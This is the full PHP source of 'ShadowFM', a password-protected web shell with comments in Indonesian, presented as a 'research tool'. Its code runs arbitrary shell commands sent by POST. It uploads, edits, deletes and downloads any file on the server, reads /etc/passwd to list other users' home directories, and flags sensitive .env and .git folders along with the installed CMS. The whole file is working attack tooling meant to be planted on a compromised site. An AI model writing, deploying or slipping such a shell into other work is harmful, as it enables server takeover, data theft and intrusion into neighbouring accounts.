<?php
/**
 * ShadowFM v2.6 - Ultimate Research Tool
 * Fix: File Color (White), Delete (Red), Terminal (Scroll), Full Logic.
 */
session_start();

// --- CONFIGURATION ---
$password = "pentest123";
$auth_hash = md5($password);

// --- LOGOUT ---
if (isset($_GET['logout'])) { session_destroy(); header("Location: ?"); exit; }

// --- AUTHENTICATION ---
if (!isset($_SESSION['logged_in'])) {
    if (isset($_POST['pass']) && md5($_POST['pass']) === $auth_hash) {
        $_SESSION['logged_in'] = true;
    } else {
        die('<body style="background:#000;color:#0f0;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;"><form method="POST"><h2>[ ACCESS RESTRICTED ]</h2><input type="password" name="pass" autofocus style="background:#111;border:1px solid #0f0;color:#0f0;padding:5px;"><button type="submit" style="background:#0f0;color:#000;border:none;padding:5px 10px;cursor:pointer;">ENTER</button></form></body>');
    }
}

function get_cms($p) {
    // PHP Based CMS & Frameworks
    if (file_exists($p.'/wp-config.php')) return "WordPress";
    if (file_exists($p.'/artisan') || is_dir($p.'/vendor/laravel')) return "Laravel";
    if (file_exists($p.'/composer.json')) {
        $composer = @file_get_contents($p.'/composer.json');
        if (strpos($composer, '"yiisoft/yii2"')) return "Yii2 Framework";
        if (strpos($composer, '"symfony/symfony"')) return "Symfony";
        if (strpos($composer, '"codeigniter4/framework"')) return "CodeIgniter 4";
        if (strpos($composer, '"magento/magento2-base"')) return "Magento 2";
    }
    if (is_dir($p.'/application/config') && file_exists($p.'/system/core/CodeIgniter.php')) return "CodeIgniter 2/3";
    if (file_exists($p.'/configuration.php') && is_dir($p.'/administrator')) return "Joomla";
    if (file_exists($p.'/core/lib/Drupal.php') || is_dir($p.'/core/themes/bartik')) return "Drupal";
    if (file_exists($p.'/settings.inc.php') || is_dir($p.'/config/xml')) return "PrestaShop";
    if (file_exists($p.'/app/Mage.php')) return "Magento 1";

    // JavaScript / Node.js Frameworks
    if (file_exists($p.'/package.json')) {
        $package = @file_get_contents($p.'/package.json');
        if (strpos($package, '"next"')) return "Next.js App";
        if (strpos($package, '"react"')) return "React App";
        if (strpos($package, '"vue"')) return "Vue.js App";
        if (strpos($package, '"@angular/core"')) return "Angular App";
        if (strpos($package, '"express"')) return "Express.js/Node";
        if (strpos($package, '"strapi"')) return "Strapi CMS";
    }

    // Static Site Generators & Others
    if (file_exists($p.'/_config.yml') && is_dir($p.'/_posts')) return "Jekyll";
    if (file_exists($p.'/hugo.toml') || file_exists($p.'/hugo.yaml')) return "Hugo";
    if (is_dir($p.'/.ghost')) return "Ghost CMS";

    // Shopify Note: Shopify adalah SaaS, jadi jika Anda menemukan file
    // "theme.liquid" atau "config/settings_schema.json",
    // itu biasanya backup theme Shopify atau sinkronisasi lokal.
    if (is_dir($p.'/layout') && file_exists($p.'/layout/theme.liquid')) return "Shopify Theme Files";

    // Generic Sensitivity
    if (file_exists($p.'/.env')) return "Env Detected (Sensitive)";
    if (is_dir($p.'/.git')) return "Git Repo Detected";

    return "Plain/Unknown";
}
// --- SYSTEM STATS COLLECTOR ---
function get_system_stats($p) {
    $s = ['linux' => php_uname('s')." ".php_uname('r'), 'server' => $_SERVER['SERVER_SOFTWARE']];
    $exec_user = @exec('whoami') ?: 'webserver';

    // 1. Deteksi Owner Direktori saat ini (Context User)
    // Mengambil owner asli dari folder yang sedang dibuka
    $path_uid = @fileowner($p);
    $path_owner_info = ($path_uid !== false && function_exists('posix_getpwuid')) ? @posix_getpwuid($path_uid) : null;
    $s['current_user'] = $path_owner_info['name'] ?? $exec_user;

    // 2. Deteksi Owner Script Asli (Tetap root/user awal)
    $script_uid = getmyuid();
    $script_owner_info = function_exists('posix_getpwuid') ? @posix_getpwuid($script_uid) : null;
    $owner_user = $script_owner_info['name'] ?? 'root';

    $uid = getmyuid();
    $owner_info = function_exists('posix_getpwuid') ? posix_getpwuid($uid) : ['name' => 'root'];
    $s['user_info'] = $s['current_user'] . " (Owner: " . ($owner_info['name'] ?? 'root') . ")";

    // Info tambahan
    $s['ip'] = $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname());
    $s['cms'] = get_cms($p);

    // SSD Logic: Try Shell first (Accurate), Fallback to PHP Internal
    $df_out = @shell_exec("df -P ".escapeshellarg($p)." | tail -1");
    $df = $df_out ? preg_split('/\s+/', trim($df_out)) : [];

    if (count($df) >= 4) {
        $s['disk'] = round($df[3]/1048576, 2)." / ".round($df[1]/1048576, 2)." GB";
    } else {
        // Fallback to PHP Internal functions
        $free = @disk_free_space($p) ?: 0;
        $total = @disk_total_space($p) ?: 0;
        $s['disk'] = round($free/1073741824, 2)." / ".round($total/1073741824, 2)." GB (Internal)";
    }

    // RAM Info
    if (file_exists("/proc/meminfo")) {
        $m = @file_get_contents("/proc/meminfo");
        preg_match_all("/(\w+):\s+(\d+)\s/", $m, $ms);
        $mi = array_combine($ms[1], $ms[2]);
        $s['ram'] = round($mi['MemTotal'] / 1048576, 2) . " GB";
    } else { $s['ram'] = "N/A"; }

    return $s;
}
function get_all_users() {
    $users = [];
    $passwd = '/etc/passwd';
    if (is_readable($passwd)) {
        $data = file($passwd);
        foreach ($data as $line) {
            $detail = explode(':', $line);
            if (count($detail) < 6) continue;
            $user = $detail[0];
            $uid  = (int)$detail[2];
            $home = $detail[5];

            // Filter user yang berpotensi memiliki folder web atau user manusia
            if ($uid >= 1000 || preg_match('/(\/(home|var\/www|srv|usr\/local\/www|opt))/i', $home)) {
                if ($user == 'nobody') continue;
                $status = @is_readable($home) ? 'READABLE' : 'LOCKED';
                $users[] = ['user' => $user, 'path' => $home, 'status' => $status];
            }
        }
    }
    return $users;
}
// --- SETUP PATH ---
$script_name = basename(__FILE__);
$path = isset($_REQUEST['path']) ? realpath($_REQUEST['path']) : realpath(dirname(__FILE__));
$path = str_replace('\\', '/', $path);
$parent_dir = str_replace('\\', '/', dirname($path));
$sys = get_system_stats($path);

// --- AJAX COMMAND HANDLER ---
if (isset($_POST['cmd'])) {
    // Berpindah direktori ke path yang dikirim sebelum eksekusi perintah
    $target_dir = isset($_POST['path']) ? $_POST['path'] : dirname(__FILE__);
    chdir($target_dir);
    echo htmlspecialchars(shell_exec($_POST['cmd'] . " 2>&1"));
    exit;
}

// --- SETUP PATH ---
$script_name = basename(__FILE__);
$path = isset($_REQUEST['path']) ? realpath($_REQUEST['path']) : realpath(dirname(__FILE__));
$path = str_replace('\\', '/', $path);
$parent_dir = str_replace('\\', '/', dirname($path));

// --- CORE ACTION LOGIC ---
if (isset($_FILES['f_up'])) {
    move_uploaded_file($_FILES['f_up']['tmp_name'], $path . '/' . $_FILES['f_up']['name']);
    header("Location: ?path=".urlencode($path)); exit;
}

if (isset($_POST['action'])) {
    $target = $_POST['target'];
    if ($_POST['action'] == 'save') {
        file_put_contents($target, $_POST['content']);
    } elseif ($_POST['action'] == 'delete') {
        is_dir($target) ? rmdir($target) : unlink($target);
    } elseif ($_POST['action'] == 'rename') {
        rename($target, dirname($target).'/'.$_POST['new_name']);
    }
    header("Location: ?path=".urlencode($path));
    exit;
}

if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        readfile($file);
        exit;
    }
}

function get_nav($p) {
    $pts = explode('/', trim($p, '/')); $r = "<a href='?path=/'>root</a> / "; $ac = "";
    foreach($pts as $pt){ if($pt==="") continue; $ac .= "/".$pt; $r .= "<a href='?path=".urlencode($ac)."'>$pt</a> / "; }
    return $r;
}
?>
<!DOCTYPE html>
<html>
<head>
<title>ShadowFM v2.6 - FINAL</title>
<style>
body { background: #000; color: #fff; font-family: 'Courier New', monospace; margin: 0; padding: 0; width: 100%; overflow-x: hidden; }
a { text-decoration: none; color: #0f0; }
.dir { color: #0f0; font-weight: bold; }
.file { color: #fff; } /* File Kembali Putih */

/* HEADER BAR */
.header-bar { display: flex; align-items: center; border-top: 1px solid #0f0; border-bottom: 1px solid #0f0; padding: 10px 0; margin-top:10px; }
.upload-section { flex: 1; text-align: left; padding-left: 10px; }
.path-section { flex: 2; text-align: center; font-size: 14px; font-weight: bold; }
.logout-section { flex: 1; text-align: right; padding-right: 10px; }

/* TERMINAL WITH SCROLLBAR */
/* Pastikan ini membungkus semua konten di body */
/* Cukup satu wrapper yang membungkus semua */
.wrapper {
    width: 100%;
    padding: 20px;
    box-sizing: border-box;
}

#term-box { margin: 20px 0; border: 1px solid #0f0; background: #050505; width: 100%; box-sizing: border-box; }
.term-split { display: flex; height: 320px; border-bottom: 1px solid #0f0; width: 100%; }

.term-tools { width: 25%; padding: 15px; border-right: 1px solid #0f0; overflow-y: auto; box-sizing: border-box; }
#term-out { width: 50%; padding: 15px; color: #0f0; font-size: 12px; white-space: pre-wrap; overflow-y: scroll; box-sizing: border-box; }
.term-stats { width: 25%; padding: 15px; background: #080808; border-left: 1px solid #0f0; box-sizing: border-box; line-height: 1.6; }

.term-tools h4, .term-stats h4 {
    margin: 0 0 10px 0;
    border-bottom: 1px solid #0f0;
    display: inline-block;
    color: #fff;
    text-transform: uppercase;
}

.neighbor-link { color: #aaa; text-decoration: none; }
.neighbor-link:hover { color: #0f0; text-decoration: underline; }

.term-in-row { display: flex; padding: 12px; background: #000; align-items: center; }
#cmd-in { background: transparent; border: none; color: #0f0; outline: none; flex: 1; font-family: monospace; font-size: 14px; }

/* TABLE STRETCH 100% */
table { width: 100%; border-collapse: collapse; table-layout: fixed; }
th { border-bottom: 2px solid #0f0; color: #0f0; padding: 12px; text-align: left; }
td { padding: 12px; border-bottom: 1px solid #1a1a1a; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
tr:hover { background: #0a0a0a; outline: 1px solid #0f0; }

.c-size { width: 130px; text-align: center; }
.c-perm { width: 100px; text-align: center; }
.c-act  { width: 230px; text-align: right; }

.btn {
    display: inline-block; /* Memastikan <a> dan <button> punya perilaku box yang sama */
    vertical-align: middle;
    color: #000;
    background: #0f0;
    padding: 4px 12px;
    font-size: 11px;
    cursor: pointer;
    border: none;
    font-weight: bold;
    margin-left: 5px;
    line-height: 1.4; /* Menyamakan tinggi baris teks */
    box-sizing: border-box;
    text-align: center;
}
.btn-del { background: #f00 !important; color: #fff !important; }
.btn-ren { background: #44f; color: #fff; }
.btn-logout { background: #f00; color: #fff; }
</style>
</head>
<body>
<div class="wrapper">
<div style="text-align:center;">
<h1>
<a href="<?= $script_name ?>" style="color:#0f0; letter-spacing: 10px;">SHADOW FILE MANAGER</a>
</h1>
</div>

<div class="header-bar">
<div class="upload-section">
<form method="POST" enctype="multipart/form-data">
<input type="file" name="f_up" required style="color:#0f0; font-size:11px; max-width: 140px;">
<input type="submit" value="UPLOAD" class="btn">
</form>
</div>
<div class="path-section">Path: <?= get_nav($path) ?></div>
<div class="logout-section">
<a href="?logout=1" class="btn btn-logout" onclick="return confirm('Exit session?')">LOGOUT</a>
</div>
</div>

<div id="term-box">
<div class="term-split">
<div id="term-out">Shadow Shell Engine v2.9...</div>
<div class="term-tools">
<div style="border-bottom:1px solid #333; padding-bottom:5px; margin-bottom:10px;">
<a href="javascript:void(0)" onclick="loadTool('neighbors')" style="font-size:10px; color:#0f0;">[ NEIGHBORS ]</a>
<a href="javascript:void(0)" onclick="loadTool('info')" style="font-size:10px; color:#888; margin-left:10px;">[ HELP ]</a>
</div>

<div id="tools-content">
<h4>[ TOOLS / NEIGHBORS ]</h4>
<div style="margin-top:5px;">
<?php
$neighbors = get_all_users();
foreach ($neighbors as $n):
    $can_read = (strpos($n['status'], 'READABLE') !== false);
?>
<div style="margin-bottom: 8px; border-bottom: 1px solid #111; padding-bottom: 4px;">
<b style="color:#0f0;"><?= $n['user'] ?></b><br>
<?php if ($can_read): ?>
<a href="?path=<?= urlencode($n['path']) ?>" class="neighbor-link" style="font-size:10px; color:#aaa;">
<?= $n['path'] ?>
</a>
<span style="font-size:9px; color:#0f0;">[READABLE]</span>
<?php else: ?>
<span style="font-size:10px; color:#555;"><?= $n['path'] ?></span>
<span style="font-size:9px; color:#f00;">[LOCKED]</span>
<?php endif; ?>
</div>
<?php endforeach; ?>
</div>
</div> </div>
<div class="term-stats">
<h4>[ SYSTEM INFO ]</h4><br><br>
<b>OS   :</b> <span style="color:#888;"><?= $sys['linux'] ?></span><br>
<b>SVR  :</b> <span style="color:#888;"><?= $sys['server'] ?></span><br>
<b>RAM  :</b> <span style="color:#888;"><?= $sys['ram'] ?></span><br>
<b>SSD  :</b> <span style="color:#888;"><?= $sys['disk'] ?></span><br>
<b>USER :</b> <span style="color:#888;"><?= $sys['user_info'] ?></span><br>
<b>IP   :</b> <span style="color:#888;"><?= $sys['ip'] ?></span><br>
<b>CMS  :</b> <span style="color:#888;"><?= $sys['cms'] ?></span>
</div>
</div>

<div class="term-in-row">
<span style="color:#0f0; margin-right:10px; font-weight:bold;">
shell@<?= $sys['current_user'] ?>:~$
</span>
<input type="text" id="cmd-in" autofocus onkeydown="runCmd(event)">
</div>
</div>

<?php if (isset($_GET['edit'])): ?>
<div style="padding: 10px;">
<h3 style="color:#fff;">Editing: <?= basename($_GET['edit']) ?></h3>
<center>
<form method="POST">
<input type="hidden" name="action" value="save"><input type="hidden" name="target" value="<?= $_GET['edit'] ?>">
<textarea name="content" style="width:70%; height:550px; background:#000; color:#fff; border:1px solid #0f0; padding:20px; font-family:monospace; line-height:1.6;"><?= htmlspecialchars(file_get_contents($_GET['edit'])) ?></textarea><br><br>
<input type="submit" class="btn" value="SAVE FILE" style="padding:10px 30px;">
<a href="?path=<?= urlencode($path) ?>" class="btn" style="background:#444; color:#fff; padding:10px 30px;">CANCEL</a>
</form>
</center>
</div>
<?php else: ?>
<table>
<thead><tr><th>Name</th><th class="c-size">Size</th><th class="c-perm">Perms</th><th class="c-act">Actions</th></tr></thead>
<tbody>
<tr><td><a href="?path=<?= urlencode($parent_dir) ?>" class="dir">.. / (Parent Directory)</a></td><td colspan="3"></td></tr>
<?php
$items = scandir($path); $dirs = []; $files = [];
function formatSize($bytes) {
    if ($bytes >= 1073741824) return round($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return round($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return round($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}
foreach ($items as $i) { if($i=="."||$i=="..")continue; is_dir($path.'/'.$i)?$dirs[]=$i:$files[]=$i; }
foreach (array_merge($dirs, $files) as $item):
    $f_p = $path.'/'.$item; $is_d = is_dir($f_p);
$p_c = (is_readable($f_p)?(is_writable($f_p)?'#0f0':'#ff0'):'#f00');
$perms = substr(sprintf('%o', fileperms($f_p)), -4);

?>
<tr>
<td><a href="?path=<?=urlencode($is_d?$f_p:$path)?><?=!$is_d?"&edit=".urlencode($f_p):""?>" class="<?=$is_d?'dir':'file'?>"><?=$item?><?=$is_d?"/":""?></a></td>
<td class="c-size" style="color:#888;">
<?= $is_d ? "--" : formatSize(filesize($f_p)) ?>
</td>
<td class="c-perm" style="color:<?=$p_c?>; font-weight:bold;"><?=$perms?></td>
<td class="c-act">
<a href="?download=<?=urlencode($f_p)?>" class="btn">DL</a>
<button onclick="let n=prompt('Rename:', '<?=$item?>'); if(n){ var f=document.createElement('form'); f.method='POST'; var a=document.createElement('input'); a.type='hidden'; a.name='action'; a.value='rename'; f.appendChild(a); var t=document.createElement('input'); t.type='hidden'; t.name='target'; t.value='<?=$f_p?>'; f.appendChild(t); var x=document.createElement('input'); x.type='hidden'; x.name='new_name'; x.value=n; f.appendChild(x); document.body.appendChild(f); f.submit(); }" class="btn btn-ren">MV</button>
<form method="POST" style="display:inline;" onsubmit="return confirm('Delete <?= ($is_d ? 'directory' : 'file') ?>: <?= $item ?>?')">
<input type="hidden" name="action" value="delete">
<input type="hidden" name="target" value="<?= $f_p ?>">
<button type="submit" class="btn btn-del">RM</button>
</form>
</td>
</tr>
<?php endforeach; ?>
</tbody>
</table>
<?php endif; ?>
</div>
<script>
function loadTool(toolName) {
    const container = document.getElementById('tools-content');

    if (toolName === 'neighbors') {
        // Reload konten asli (Neighbors) via AJAX
        refreshFileList();
    }
    else if (toolName === 'info') {
        container.innerHTML = `
        <h4>[ COMMAND HELP ]</h4>
        <div style="color:#aaa; font-size:10px; line-height:1.5;">
        <b style="color:#0f0;">mkdir [name]</b> - Create dir<br>
        <b style="color:#0f0;">rm -rf [name]</b> - Delete<br>
        <b style="color:#0f0;">unzip [file]</b> - Extract zip<br>
        <b style="color:#0f0;">clear</b> - Clear terminal<br><br>
        <i style="color:#666;">More tools coming soon...</i>
        </div>
        `;
    }
}

// Update fungsi refreshFileList agar mendukung penarikan ulang konten Neighbors
function refreshFileList() {
    const currentPath = new URLSearchParams(window.location.search).get('path') || '';
    fetch('?path=' + encodeURIComponent(currentPath))
    .then(response => response.text())
    .then(html => {
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');

        if (doc.querySelector('table')) document.querySelector('table').innerHTML = doc.querySelector('table').innerHTML;
        if (doc.querySelector('.term-stats')) document.querySelector('.term-stats').innerHTML = doc.querySelector('.term-stats').innerHTML;
        if (doc.querySelector('.term-tools')) document.querySelector('.term-tools').innerHTML = doc.querySelector('.term-tools').innerHTML;

        // --- UPDATE PROMPT TERMINAL ---
        const newPrompt = doc.querySelector('.term-in-row span');
        if (newPrompt) document.querySelector('.term-in-row span').innerHTML = newPrompt.innerHTML;

        // Update URL di browser agar tetap sinkron
        window.history.pushState(null, '', '?path=' + encodeURIComponent(currentPath));
    });
}

// Fungsi eksekusi perintah shell
function runCmd(e) {
    if (e.keyCode === 13) {
        const cmdInput = document.getElementById('cmd-in');
        const cmd = cmdInput.value;
        const out = document.getElementById('term-out');
        // Ambil path saat ini dari URL
        const currentPath = new URLSearchParams(window.location.search).get('path') || '<?= addslashes($path) ?>';

        if (cmd.toLowerCase() === 'clear') {
            out.innerHTML = 'Terminal Cleared.';
            cmdInput.value = '';
            return;
        }

        // Kirim perintah DAN path ke PHP
        fetch('', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'cmd=' + encodeURIComponent(cmd) + '&path=' + encodeURIComponent(currentPath)
        })
        .then(r => r.text())
        .then(d => {
            out.innerHTML += "\n<span style='color:#fff;'>$ " + cmd + "</span>\n" + d;
            out.scrollTop = out.scrollHeight;
            cmdInput.value = '';
        refreshFileList();
        });
    }
}
</script>
</body>
</html>
